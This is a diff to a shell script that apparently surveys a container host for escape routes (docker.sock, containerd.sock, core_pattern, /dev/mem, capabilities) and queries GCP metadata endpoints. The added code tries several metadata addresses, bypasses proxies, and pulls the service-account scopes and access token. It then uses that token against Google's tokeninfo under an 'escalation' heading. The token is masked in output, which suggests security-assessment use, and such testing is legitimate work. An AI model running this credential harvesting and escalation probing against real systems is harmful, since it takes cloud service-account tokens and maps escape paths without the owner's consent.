@@ -12,18 +12,33 @@ echo "## caps + ns + cgroup"; grep -E 'Cap(Eff|Prm|Bnd)' /proc/self/status; read
 echo "## mounts (host/docker/k8s/secret hints)"; grep -iE 'docker|containerd|kube|secret|overlay|/dev/(vd|sd|nvme)|hostpath|gcs|csi' /proc/self/mountinfo 2>/dev/null|head -25
 echo "## escape surface"; ls -la /var/run/docker.sock /run/containerd/containerd.sock 2>/dev/null; echo "core_pattern=$(cat /proc/sys/kernel/core_pattern 2>/dev/null)"; ls -la /dev/mem 2>/dev/null
 echo "## == GCP METADATA =="
-M="http://metadata.google.internal/computeMetadata/v1"; H="Metadata-Flavor: Google"
-PROJECT_ID=$(curl -s -m6 -H "$H" "$M/project/project-id")
-NUMERIC_PROJECT_ID=$(curl -s -m6 -H "$H" "$M/project/numeric-project-id")
-SA_EMAIL=$(curl -s -m6 -H "$H" "$M/instance/service-accounts/default/email")
+H="Metadata-Flavor: Google"
+M=""
+for candidate in \
+  "dns|http://metadata.google.internal/computeMetadata/v1" \
+  "ipv4|http://169.254.169.254/computeMetadata/v1" \
+  "alias|http://metadata.goog/computeMetadata/v1"; do
+  label=${candidate%%|*}; root=${candidate#*|}
+  code=$(curl --noproxy '*' -s -m4 -o /dev/null -w '%{http_code}' -H "$H" "$root/project/project-id" 2>/dev/null) || code=000
+  echo "metadata-$label project_code=$code"
+  if [ -z "$M" ] && [ "$code" = 200 ]; then M="$root"; fi
+done
+meta_get(){ curl --noproxy '*' -s -m6 -H "$H" "$1"; }
+if [ -n "$M" ]; then
+  PROJECT_ID=$(meta_get "$M/project/project-id")
+  NUMERIC_PROJECT_ID=$(meta_get "$M/project/numeric-project-id")
+  SA_EMAIL=$(meta_get "$M/instance/service-accounts/default/email")
+else
+  PROJECT_ID=""; NUMERIC_PROJECT_ID=""; SA_EMAIL=""
+fi
 echo "project: $PROJECT_ID"
 echo "numeric: $NUMERIC_PROJECT_ID"
 echo "sa-email: $SA_EMAIL"
-echo "sa-scopes:"; curl -s -m6 -H "$H" "$M/instance/service-accounts/default/scopes"
-TOKJSON=$(curl -s -m6 -H "$H" "$M/instance/service-accounts/default/token")
+echo "sa-scopes:"; [ -n "$M" ] && meta_get "$M/instance/service-accounts/default/scopes"
+TOKJSON=""; [ -n "$M" ] && TOKJSON=$(meta_get "$M/instance/service-accounts/default/token")
 ATOK=$(echo "$TOKJSON" | sed -n 's/.*"access_token":"\([^"]*\)".*/\1/p')
 echo "sa-token: $(red "$ATOK") (redacted)"
-echo "instance-attrs: $(curl -s -m6 -o /dev/null -w 'http=%{http_code} bytes=%{size_download}' -H "$H" "$M/instance/attributes/?recursive=true")"
+if [ -n "$M" ]; then echo "instance-attrs: $(curl --noproxy '*' -s -m6 -o /dev/null -w 'http=%{http_code} bytes=%{size_download}' -H "$H" "$M/instance/attributes/?recursive=true" 2>/dev/null)"; else echo "instance-attrs: not-queried"; fi
 echo "== USE SA token to test access (escalation) =="
 if [ -n "$ATOK" ]; then
   echo "tokeninfo scopes:"; curl -s -m6 "https://oauth2.googleapis.com/tokeninfo?access_token=$ATOK" | head -c 400; echo
